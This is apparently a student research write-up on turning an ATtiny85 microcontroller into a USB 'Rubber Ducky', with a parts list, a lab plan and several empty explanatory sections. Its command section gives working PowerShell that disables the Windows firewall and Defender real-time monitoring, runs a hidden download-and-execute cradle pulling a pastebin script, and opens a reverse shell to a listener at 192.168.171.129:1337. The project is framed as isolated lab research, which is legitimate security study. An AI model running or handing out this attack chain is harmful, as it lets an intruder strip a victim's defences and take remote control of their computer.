
# ATtiny85 USB "Rubber Ducky"
## Creating a rubber ducky from an inexpensive programmable microcontroller and deploy a payload on a patched Windows 10 system.
 A research project by: Nate Ward.

### Why this project?

Outside of computers and cybersecurity, I have several other hobbies that I find interesting. One of such interests is electronics prototyping and another is 3D printing. After some initial searching, I found a topic that would be both interesting and demonstratible marrying several of my hobbies and interests. After some Google searching for topics, I chose using a ATtiny85 microcontroller as a inexpensive "Rubber Ducky". After settling on this project, I had to find a payload for the "Rubber Ducky" to deploy. I found that opening a reverse shell would be an excellent use of this device. I wanted to try and make this as stealthy as possible and not require complicated dependancies. The initial version will be attempted using a pure Powershell reverse shell script from [Nikhil Mittal [1]](http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html).

### Project Steps and Requirements.

After reading through a guide availible from the website inc0x0 [2], I was able to layout a general plan for this project and research.

1. Create a lab that will allow me to isolate and test in a controlled enviorment. For this I will be using VMWare Workstation 16 Player (availible at [VMWare.com](https://www.vmware.com/products/workstation-player.html)).
	- Will need at least one of each of the following; Windows 10/11 workstation, Linux workstation.
2. Obtain a ATtiny85 from an online retailer.
	- I will be using Amazon for this one, they are in stock and a 5 pack only costs ~ $15.
	- While I'm on Amazon, I picked up some USB 3.0 Male to Female (Type A) adapters. **More on item this later.**
3. Install the Arduino IDE on my personal comuter for compiling and uploading the "Rubber Ducky" code to the ATtiny85.
	- This is a free download availible from [Arduio.cc](https://www.arduino.cc).
4. Some form of screen capture software to record my steps and demostration.
	- For this I chose "OBS Studio", also a free download from their website at [OBSProject.com](https://obsproject.com/).
5. Some additonal research for a reverse shell script. Using Powershell or a scripting language.
	- I will be research a few different methods for completing this task, first I would like to try and complete this tack using a pure powershell script.
	- After further research and a proof of conecpt on the powershell version from above, I chose to research and develop a Python script.

### What is a ATtiny85?



### What is a Rubber Ducky?









1. Rubber Ducky Commands

Turn "OFF" firewall.
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
```

Disable real-time virus monitoring.
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true;
```

Change pastebin link to your script.
```powershell 	
powershell -windowstyle hidden -nop IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/TnfTv8rt');
```


Powershell reverse shell Script.
```powershell	
$sm=(New-Object Net.Sockets.TCPClient("192.168.171.129",1337)).GetStream();
[byte[]]$bt=0..255|%{0};
while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
$sm.Write($st,0,$st.Length)}
```









# References & Cited Work.<a id="references"></a> 
[1] Week of Powershells. By: Nikhil Mittal, Written May 2015. @ http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
[2] Budget "USB Rubber Ducky" - Digispark ATtiny85. By: inc0x0, Written Obctober 2018. @ https://inc0x0.com/2018/10/budget-usb-rubber-ducky-digispark-attiny85/
[3] How to Create a Reverse Shell in Python. By: Abdou Rockikz, Updated August 2022. @ https://www.thepythoncode.com/article/create-reverse-shell-python
[4] Disable Defender Powershell with Code Examples. By Unknown (Folkstalk.com). @ https://www.folkstalk.com/2022/09/disable-defender-powershell-with-code-examples.html

5. Software and Links.
[A] Windows 10 Installation Media - https://www.microsoft.com/en-us/software-download/windows10https://www.microsoft.com/en-us/software-download/windows10